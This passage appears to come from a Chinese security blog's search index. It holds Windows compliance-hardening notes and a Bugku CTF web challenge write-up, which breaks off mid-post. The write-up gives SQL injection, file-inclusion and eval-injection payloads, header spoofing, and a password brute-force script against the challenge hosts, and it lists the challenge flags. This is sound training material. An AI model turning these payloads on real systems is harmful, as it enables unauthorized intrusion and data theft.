src="https://bp.yuanlichenai.cn/Wifi-QRcode/2018-07-03-11-53-32.jpg" alt="" title="" class="">                <p></p>            </figure><h2 id="小米"><a href="#小米" class="headerlink" title="小米"></a>小米</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Wifi-QRcode/2018-07-03-12-35-04.png" alt="" title="" class="">                <p></p>            </figure><p>使用限制：<br>支持系统自带扫码功能的手机，无论是相机，系统浏览器，还是系统自带扫一扫都可以<br>苹果IOS11及以上版本相机支持二维码扫码</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>微信扫码设置麻烦，需要商户版本的公众账号，普通个人的公众账号不能使用，但是用户体验一级棒；<br>手机扫码设置方便，但是用户体验较差，需要支持系统二维码扫码的手机才可以。</p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOS </tag>
            
            <tag> Android </tag>
            
            <tag> 二维码 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WindowsDJBH</title>
      <link href="/2018/06/14/WindowsDJBH/"/>
      <url>/2018/06/14/WindowsDJBH/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Windows等级保护2.0笔记</p></blockquote><a id="more"></a><h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><h1 id="身份鉴别"><a href="#身份鉴别" class="headerlink" title="身份鉴别"></a>身份鉴别</h1><h2 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2><ul><li>本地安全策略</li></ul><figure class="highlight bash"><figcaption><span>命令行打开</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secpol.msc</span><br></pre></td></tr></table></figure><p>开始→程序→管理工具→本地安全策略→安全设置→帐号策略→密码策略<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认值</span></span><br><span class="line">密码必须符合复杂性要求：已禁用</span><br><span class="line">密码长度最小值：0个字符</span><br><span class="line">密码最短使用期限：0天</span><br><span class="line">密码最长使用期限：42天</span><br><span class="line">强制密码历史：0个记住的密码</span><br><span class="line">用可还原的加密来储存密码：已禁用</span><br><span class="line"><span class="comment"># 推荐值</span></span><br><span class="line">密码必须符合复杂性要求：已启用</span><br><span class="line">密码长度最小值：8个字符</span><br><span class="line">密码最短使用期限：1天</span><br><span class="line">密码最长使用期限：90天</span><br><span class="line">强制密码历史：5个记住的密码</span><br><span class="line">用可还原的加密来储存密码：已禁用</span><br></pre></td></tr></table></figure></p><blockquote><p>需在计算机管理→本地用户和组→用户 每个账户选择中取消勾选<strong>密码永不过期</strong></p></blockquote><ul><li>查看账户信息</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br></pre></td></tr></table></figure><h2 id="登录失败"><a href="#登录失败" class="headerlink" title="登录失败"></a>登录失败</h2><p>开始→程序→管理工具→本地安全策略→安全设置→帐号策略→账户锁定策略<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认值</span></span><br><span class="line">账户锁定时间：不适用</span><br><span class="line">账户锁定阈值：0次无效登陆</span><br><span class="line">重置账户锁定计数器：不适用</span><br><span class="line"><span class="comment"># 推荐值</span></span><br><span class="line">账户锁定时间：30分钟</span><br><span class="line">账户锁定阈值：5次无效登陆</span><br><span class="line">重置账户锁定计数器：30分钟</span><br></pre></td></tr></table></figure></p><h2 id="登录超时"><a href="#登录超时" class="headerlink" title="登录超时"></a>登录超时</h2><ul><li><p>屏幕保护程序<br>需要密码保护，时间不超过30分钟。</p></li><li><p>远程桌面会话设置</p><ul><li><p>Windows xp/Vista/2008/2008R2<br>管理工具→Terminal Servers-终端服务配置/终端服务配置，选择RDP-tcp查看属性，选择会话</p><ul><li><ul><li style="list-style: none"><input type="checkbox" checked> 替代用户设置<br>空闲会话限制：10分钟</li></ul></li><li><ul><li style="list-style: none"><input type="checkbox" checked> 替代用户设置<ul><li style="list-style: none"><input type="checkbox"> 从会话断开</li><li style="list-style: none"><input type="checkbox" checked> 结束会话</li></ul></li></ul></li></ul></li><li><p>Windows 2012以上<br>打开<strong>本地组策略编辑器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc</span><br></pre></td></tr></table></figure><p>管理模板→windows组件→远程桌面服务→会话时间限制<br><strong>活动但空闲的远程桌面服务会话的时间限制</strong> 设置为10分钟<br><strong>达到时间限制终止会话</strong> 设置为启用</p></li></ul></li></ul><h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><ul><li><p>Windows xp/Vista/2008/2008R2<br>管理工具→Terminal Servers-终端服务配置/终端服务配置，选择RDP-tcp查看属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">安全层：协商</span><br><span class="line">加密级别：客户端兼容</span><br><span class="line">仅允许运行使用网络级别的身份验证的远程桌面的计算机连接：</span><br></pre></td></tr></table></figure></li><li><p>Windows 2012以上<br>注册表：计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SecurityLayer <span class="comment">#安全层</span></span><br><span class="line">0-RDPSecurity Layer</span><br><span class="line">1-Negotiate</span><br><span class="line">2-SSL(TLS1.0)</span><br><span class="line"></span><br><span class="line">MinEncryptionLevel <span class="comment">#加密级别</span></span><br><span class="line">1-Low</span><br><span class="line">2-ClientCompatible</span><br><span class="line">3-High</span><br><span class="line">4-FIPSCompliant</span><br><span class="line"></span><br><span class="line">UserAuthentication</span><br><span class="line">0-未勾选</span><br><span class="line">1-勾选</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight bash"><figcaption><span>推荐值</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全层：SSL</span><br><span class="line">机密级别：客户端兼容/高/符合FIPS标准</span><br><span class="line">仅允许运行使用网络级别的身份验证的远程桌面的计算机连接：勾选</span><br><span class="line">证书：使用默认SSL证书/使用CA机构签发的证书</span><br></pre></td></tr></table></figure><h2 id="双因子身份鉴别"><a href="#双因子身份鉴别" class="headerlink" title="双因子身份鉴别"></a>双因子身份鉴别</h2><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><figure class="highlight bash"><figcaption><span>用户账户和组</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure><h1 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h1><h2 id="审核策略"><a href="#审核策略" class="headerlink" title="审核策略"></a>审核策略</h2><p>控制面板→管理工具→本地安全策略→本地策略→审核策略<br><figure class="highlight plain"><figcaption><span>推荐值</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">审核策略更改：成功</span><br><span class="line">审核登录事件：成功，失败</span><br><span class="line">审核对象访问：成功</span><br><span class="line">审核过程追踪：成功</span><br><span class="line">审核目录服务访问：失败</span><br><span class="line">审核特权使用：成功</span><br><span class="line">审核系统事件：成功</span><br><span class="line">审核帐户登录事件：成功，失败</span><br><span class="line">审核帐户管理：成功</span><br></pre></td></tr></table></figure></p><h2 id="日志内容"><a href="#日志内容" class="headerlink" title="日志内容"></a>日志内容</h2><p>计算机管理→事件查看器</p><h1 id="入侵防范"><a href="#入侵防范" class="headerlink" title="入侵防范"></a>入侵防范</h1><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><figure class="highlight bash"><figcaption><span>命令行</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>可能的多余服务</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Print Spooler、Remote Registry、server、TCP\IP NetBIOS Helper、Task Scheduler</span><br><span class="line">打印服务、远程注册表、文件共享、主机解析服务、计划任务</span><br></pre></td></tr></table></figure><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | more</span><br><span class="line">netstat -anb <span class="comment">#端口以及执行文件，需管理员权限</span></span><br><span class="line">netstat -ano <span class="comment">#端口以及进程</span></span><br><span class="line">netstat -ano | findstr 135</span><br><span class="line">netstat -ano | findstr 139</span><br><span class="line">netstat -ano | findstr 445</span><br></pre></td></tr></table></figure><h2 id="默认共享："><a href="#默认共享：" class="headerlink" title="默认共享："></a>默认共享：</h2><ul><li>查看默认共享</li></ul><figure class="highlight bash"><figcaption><span>查看默认共享命令</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><figure class="highlight bash"><figcaption><span>参数</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt;net share</span><br><span class="line"></span><br><span class="line">共享名       资源                            注释</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------</span><br><span class="line">IPC$                                         远程 IPC</span><br><span class="line">ADMIN$       C:\WINDOWS                      远程管理</span><br><span class="line">D$           D:\                             默认共享</span><br><span class="line">C$           C:\                             默认共享</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li>删除共享，重启后失效</li></ul><p>在<code>计算机管理→系统工具→共享文件夹→共享</code>中删除<br><figure class="highlight bash"><figcaption><span>命令行</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net share C$ /del</span><br><span class="line">net share D$ /del</span><br><span class="line">net share IPC$ /del</span><br><span class="line">net share ADMIN$ /del</span><br></pre></td></tr></table></figure></p><ul><li>永久生效需修改注册表：</li></ul><p>关闭C\$、D\$、E\$一类的共享：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters</code>，<code>AutoShareServer</code>设置为0。<br>关闭ADMIN$共享：在同样的分支下，将右侧窗口中的<code>AutoShareWKs</code>设置为0。</p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> 等级保护 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bugku-Web-writeup</title>
      <link href="/2018/05/29/Bugku-Web-writeup/"/>
      <url>/2018/05/29/Bugku-Web-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Bugku Web类题目</p></blockquote><a id="more"></a><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>打开网页,F12<br><!--KEY{Web-2-bugKssNNikls9100}--></p><h1 id="文件上传测试"><a href="#文件上传测试" class="headerlink" title="文件上传测试"></a>文件上传测试</h1><p>Flag格式：Flag:xxxxxxxxxxxxx<br>找一张图片，后缀改成php即可<br><!--Flag:42e97d465f962c53df9549377b513c7e--></p><h1 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h1><p>打开网页，输入答案发现前端限制了字符长度<br>F12修改长度为2,或者直接删掉也行<br><!--flag{CTF-bugku-0032}--></p><h1 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h1><figure class="highlight plain"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/get/?what=flag</span><br></pre></td></tr></table></figure><!--flag{bugku_get_su8kej2en}--><h1 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h1><p>火狐HackBar发送post数据，<br>what=flag<br>或者写个脚本<br><figure class="highlight python"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.post(<span class="string">'http://120.24.86.145:8002/post/'</span>,data=&#123;<span class="string">'what'</span>:<span class="string">'flag'</span>&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p><!--flag{bugku_get_ssseint67se}--><h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><p>做了过滤，用注释符过滤<br><figure class="highlight plain"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/get/index1.php?num=1 #</span><br></pre></td></tr></table></figure></p><!--flag{bugku-789-ps-ssdf}--><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>打开会有弹框，直接查看源码<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">view-source:http://120.24.86.145:8002/web3/</span></span><br></pre></td></tr></table></figure></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;</span></span><br></pre></td></tr></table></figure><p>html编码，解码即可<br><!--KEY{J2sa42ahJK-HS11III}--></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>格式KEY{}<br><figure class="highlight"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=0%df' union select 1,database() %23</span><br><span class="line">http://103.238.227.13:10083/?id=0%df' union select 1,string from sql5.key %23</span><br></pre></td></tr></table></figure></p><!--54f3320dc261f313ba712eb3f13a1f6d--><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>修改本机hosts值，或者用bp抓包修改host<br><figure class="highlight html"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /? HTTP/1.1</span><br><span class="line">Host: ctf.bugku.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: </span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p><!--KEY{DSAHDSJ82HDS2211}--><h1 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h1><figure class="highlight plain"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? id=1 unio&lt;&gt;n selec&lt;&gt;t 1,database() %23</span><br><span class="line">?id=1 uni&lt;a&gt;on sel&lt;a&gt;ect 1,hash fr&lt;a&gt;om sql3.key%23</span><br></pre></td></tr></table></figure><!--KEY{c3d3c17b4ca7f791f85e#$1cc72af274af4adef}--><h1 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h1><p>右键源代码，一直按F5直到<code>flag is here</code>处出现flag<br><!--flag{dummy_game_1s_s0_popular}--></p><h1 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8003/index.php?hello=file("flag.php")</span><br></pre></td></tr></table></figure><!--flag{bug-ctf-gg-99}--><h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><figure class="highlight php"><figcaption><span>源代码</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable ! <span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/anjiaowangmenghan/article/details/76460872" target="_blank" rel="noopener">bugku 变量1 - CSDN博客</a><br><!--flag{92853051ab894a64f7865cf3c2128b34}--></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>右键源代码，jsfuck<br><!--CTF{WHATFK}--></p><h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><p>flag在响应头里233<br><!--flag{Bugku_k8_23s_istra}--></p><h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>网站被黑一般都会有shell，用御剑扫描↓<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Web/2018-07-27-09-40-22.png" alt="" title="" class="">                <p></p>            </figure><br>访问需要密码，字典爆破即可<br><!--密码：hack--><br><!--flag{hack_bug_ku035}--></p><h1 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h1><p>右键审查元素看到被base64编码过的密码(右键源代码在第5023行)，提示<code>IP禁止访问，请联系本地管理员登陆，IP已被记录.</code>，所以这里需要修改数据包。<br>添加以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p><!--flag{85ff2ee4171396724bae20c0bd851f6b}--><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>右键源代码，url解码得到代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="string">'function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b'</span>;</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="string">'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;'</span>;</span><br><span class="line"><span class="keyword">eval</span>(unescape(p1) + unescape(<span class="string">'54aa2'</span> + p2));</span><br></pre></td></tr></table></figure></p><p>拼接的到MD5值：<code>67d709b2b54aa2aa648cf6e87a7114f1</code>，提交就可以得到flag<br>PS：我先提交的是解密后的，结果不需要解密，emmmm<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Web/2018-07-27-10-00-17.png" alt="" title="" class="">                <p></p>            </figure><br><!--KEY{J22JK-HS11}--></p><h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><p>文件包含，参考：<a href="https://blog.csdn.net/wy_97/article/details/77432002" target="_blank" rel="noopener">谈一谈php://filter的妙用</a><br><figure class="highlight plain"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p><p>base64解码得到flag<br><!--flag{edulcni_elif_lacol_si_siht}--></p><h1 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h1><p>五位数密码爆破,用脚本爆破<br><figure class="highlight python"><figcaption><span>Payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/baopo/'</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    <span class="comment"># r.encoding = 'utf-8'</span></span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">100000</span>):</span><br><span class="line">        r = s.post(url, data=&#123;<span class="string">'pwd'</span>: i&#125;)</span><br><span class="line">        r.encoding=<span class="string">'utf-8'</span></span><br><span class="line">        a = re.findall(<span class="string">r'密码不正确，请重新输入'</span>,r.text)</span><br><span class="line">        <span class="comment"># print(a)</span></span><br><span class="line">        <span class="keyword">if</span> a:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><!--flag{bugku-baopo-hah}--><h1 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h1><figure class="highlight js"><figcaption><span>源代码</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> clicks=<span class="number">0</span></span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      $(<span class="string">"#cookie"</span>)</span><br><span class="line">        .mousedown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          $(<span class="keyword">this</span>).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          $(<span class="keyword">this</span>).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">          <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;</span><br><span class="line">          <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">$(<span class="string">'body'</span>).append(form);</span><br><span class="line">form.submit();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Web/2018-07-27-14-47-16.png" alt="使用hackbar神器" title="" class="">                <p>使用hackbar神器</p>            </figure><figure class="highlight python"><figcaption><span>python脚本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line">r = requests.post(<span class="string">'http://120.24.86.145:9001/test/'</span>,data=&#123;<span class="string">'clicks'</span>:<span class="number">1000000</span>&#125;)</span><br><span class="line">a = re.findall(<span class="string">r'flag&#123;(.*)&#125;'</span>, r.text)</span><br><span class="line">print(<span class="string">'flag&#123;%s&#125;'</span>%a[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><!--flag{Not_C00kI3Cl1ck3r}--><h1 id="听说备份是个好习惯"><a href="#听说备份是个好习惯" class="headerlink" title="听说备份是个好习惯"></a>听说备份是个好习惯</h1><p>备份的话可能是文件后面加<code>.bak</code>的文件，Linux运维习惯233<br>访问<code>http://120.24.86.145:8002/web16/index.php.bak</code>，下载到源码<br><figure class="highlight php"><figcaption><span>index.php源代码</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 